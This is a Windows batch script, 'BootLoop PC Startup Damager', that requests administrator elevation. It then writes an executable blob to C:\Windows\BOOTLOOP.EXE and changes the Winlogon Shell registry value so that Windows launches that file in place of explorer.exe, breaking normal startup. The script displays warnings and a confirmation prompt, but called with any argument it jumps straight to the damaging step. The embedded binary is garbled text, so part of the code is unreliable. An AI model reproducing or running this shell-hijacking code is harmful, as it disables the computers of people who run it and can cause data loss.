@echo off
set RESTARTCOMPUTER=0
setlocal enabledelayedexpansion
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo IF YOU RAN THIS PROGRAM BY ACCIDENT, MAKE SURE TO SAY 'NO' TO THE UAC PROMPT.
    echo Please wait for admin privileges to be authorised. Admin privileges must be present in order for BootLoop to run properly.
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb RunAs"
    exit /b
)
color 4
title BootLoop PC Startup Damager
if not "%1"=="" (
    goto :NUKE
)
title BootLoop PC Startup Damager
echo BootLoop PC Startup Damager
echo (c) GmaerWoftSare Porcoration. Open-source.
echo WARNING! THIS WILL COMPLETELY NUKE YOUR COMPUTER'S ABILITY FROM STARTING PROPERLY.
echo Do you want do proceed?
echo [1] Yes
echo [2] No
choice /c:12 /m "Choose an option: "
IF ERRORLEVEL 2 GOTO QUIT
IF ERRORLEVEL 1 GOTO NUKE
:NUKE
echo Z¸@º´Í!¸LÍ!ThisprogramcannotberuninDOSmode.$ÜÆ‘Œ˜§ÿß˜§ÿß˜§ÿßì&üÞ“§ÿßì&úÞ§ÿßì&ûÞ‹§ÿß.üÞŒ§ÿß.ûÞ§ÿß.úÞ¾§ÿß‘ßlßš§ÿßì&þÞŸ§ÿß˜§þßà§ÿß.÷Þ™§ÿß.ß™§ÿß.ýÞ™§ÿßRich˜§ÿßPELÉåähà,D|Dl`òÝ@„þd@HŸºX7à@`ðT ï@`À.text¹CD`.rdataè¨`ªH@@.data˜ò@À.fptable€0þ@À.rsrcHŸ@ @@.reloc@à 
@B¸%CÃÌÌÌÌÌÌÌÌÌÌ¸ˆ%CÃÌÌÌÌÌÌÌÌÌÌU‹ìƒäøEPjÿu > C:\WINDOWS\BOOTLOOP.EXE
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "C:\Windows\BOOTLOOP.EXE" /f
echo Done! If you want to revert, it is recommended to use Lan Internet Registry Changer (regchg.bat) as it will have an option to reset to a default shell of explorer.exe
echo.
echo The changes have been applied successfully. For the changes to apply to the computer, it must be restarted. However it is recommended that you save all your work before restarting as not doing so could result in data loss. GmaerWoftSare Porcoration will NOT be responsible for ANY damages that result from the use of this program.
pause
:QUIT
exit /b
